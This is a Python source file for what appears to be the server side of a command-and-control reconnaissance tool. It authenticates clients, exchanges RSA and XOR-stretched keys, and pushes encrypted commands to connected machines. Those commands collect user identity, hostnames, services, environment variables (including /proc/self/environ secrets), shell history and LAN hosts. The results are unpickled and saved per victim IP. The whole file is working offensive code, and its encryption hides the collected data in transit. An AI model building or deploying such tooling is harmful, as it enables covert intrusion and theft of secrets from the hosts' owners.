import socket, pickle, subprocess, sys
from itertools import cycle
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

# Gather local socket information; Requires Internet Access
local_host = get_ip_address()
local_port = 1234

# Variables used for Authentication
whats_passd = b"[+] What is the password?"
failed_msg = b"[+] Authentication failed"

# Location of Authentication File
secret_file = "key.txt"

# Commands to be run on the client
cmd_dict = {"User Info":["id"],
            "Computer Name":["hostname"],
            "Computer Info":["uname","-a"],
            "Computer Architecture":["lscpu"],
            "Services Running":["netstat","-plant"],
            "Environment Variables":["cat","/proc/self/environ"],
            "User History":["history"],
            "Groups":["groups"],
            "LAN Computers":["arp","-a"]
            }
commands = bytes(pickle.dumps(cmd_dict))

def clear_server_port(local_port_number: int) -> None:
    pid = ""
    result = subprocess.run(["netstat","-plant"],text=True, capture_output=True, check=False)
    for i in result.stdout.split("\n"):
        if str(local_port_number) in i:
            pid += i.split()[-1].split("/")[0]
            if len(pid) > 0:
                kill = subprocess.run(["kill","-9",pid], text=False, capture_output=False, check=False)
            else:
                pass

def recv_until(socket):
    end_byte = b"\x90"
    received = b""
    while end_byte not in received:
        received += socket.recv(1)
    return received[:-1]

def create_server(host: str, port: int) -> socket:
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind((host,port))
    sock.listen()
    return sock

def get_pass_key(key_file: str) -> str:
    enc_key = ""
    with open(key_file,"r") as temp:
        enc_key += temp.read()
    return enc_key

def verify_key(encrypted_key: str, received_key: str) -> bool:
    if encrypted_key.strip("\n") == received_key:
        return True
    else:
        return False

def generate_asym_key_pair() -> classmethod:
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return private_key

def serialize_keys_for_strg_trans(priv_k: classmethod, pub_k: classmethod) -> bytes:
    pem_priv = priv_k.private_bytes(encoding=serialization.Encoding.PEM,
                                    format=serialization.PrivateFormat.PKCS8,
                                    encryption_algorithm=serialization.NoEncryption()
                                    )
    pem_pub = pub_k.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return pem_priv, pem_pub

def decrypt_data_asym(priv_k: classmethod, data) -> str:
    dec_plaintext = priv_k.decrypt(data,
                                   padding.OAEP(
                                       mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                       algorithm=hashes.SHA256(),
                                       label=None
                                       ))
    return dec_plaintext.decode("utf-8")

def encrypt_w_sym(key: bytes, msg: bytes) -> bytes:
    enc_msg = bytes([k ^ m for k,m in zip(key,msg)])
    return enc_msg

def decrypt_w_sym(key: bytes, msg: bytes) -> str:
    dec_msg = bytes([k ^ m for k,m in zip(key,msg)])
    return dec_msg

def stretch_sym_key(key: str, msg: bytes) -> bytes:
    stretched_key = ""
    cycled_key = cycle(key)
    for i in cycled_key:
        if len(stretched_key) < len(msg):
            stretched_key += i
        else:
            return bytes(stretched_key,"utf-8")

def save_result(storage_file: str, data: dict, client_ip: str) -> None:
    with open(f"{storage_file}-{client_ip}.txt", "w") as temp:
        for key,value in data.items():
            temp.write(f"[+][+][+][+][+] {key}\n")
            temp.write(value +"\n")
    print(f"[+] Results to saved to: {storage_file}-{client_ip}.txt")

def main(lhost: str, lport: int, pass_msg: str, msg2: str) -> None:

    try:
        # Killing any processes that may be running on the server port
        clear_server_port(local_port)

        # Obtain hashed password from local file
        local_key = get_pass_key(secret_file)

        # Generate private/public keys
        priv_key = generate_asym_key_pair()
        pub_key = priv_key.public_key()

        # Serialize keys for storage and transportation
        PEM_private, PEM_public = serialize_keys_for_strg_trans(priv_key, pub_key)
        
        # Create server socket listening on "host":"port"
        server_socket = create_server(lhost,lport)
        print(f"[+] Local Server Started -- {local_host}:{local_port}")

        while True:
            client, ip_tup = server_socket.accept()
            c_ip, c_port = ip_tup

            # Sending initial password request
            client.sendall(pass_msg)

            # Receive password from client
            passw = client.recv(1024).decode("utf-8")

            # Verify if password is correct
            passw_is_true = verify_key(local_key, passw)

            if passw_is_true:
                print(f"\n[+] Successful authentication: {c_ip}:{c_port}")

                            # Send public key
                client.sendall(PEM_public)

                # Obtaining symmetric key from client
                sym_key = client.recv(256)

                # Decrypting the symmetric key from client
                dec_sym_key = decrypt_data_asym(priv_key, sym_key)

                # Stretch key for commands
                stretched_sym_key = stretch_sym_key(dec_sym_key, commands)
                
                # Encrypt commands with symmetric key
                enc_commands = encrypt_w_sym(stretched_sym_key, commands)

                # Sending encrypted commands with end byte
                end_byte = b"\x90"
                client.sendall(enc_commands + end_byte)

                # Obtaining Results from Client
                enc_results = recv_until(client)

                # Stretching Key for Results
                strch_sym = stretch_sym_key(dec_sym_key, enc_results)

                # Decrypting results
                decr_results = decrypt_w_sym(strch_sym, enc_results)

                # De-Pickeling Results
                depickled_results = pickle.loads(decr_results)

                # Saving Reults to file
                save_result("results", depickled_results, c_ip)
            
            else:

                # Send Failed Authentication Message; Close Connection
                client.sendall(msg2)
                client.close()
    
    except KeyboardInterrupt:
        print("\n[+] ...exiting")
        sys.exit()

    except Exception as e:
        print(f"[+] Exception thrown ...exiting\n[+] {e}")
        sys.exit()

if __name__ == "__main__":
    main(local_host, local_port, whats_passd, failed_msg)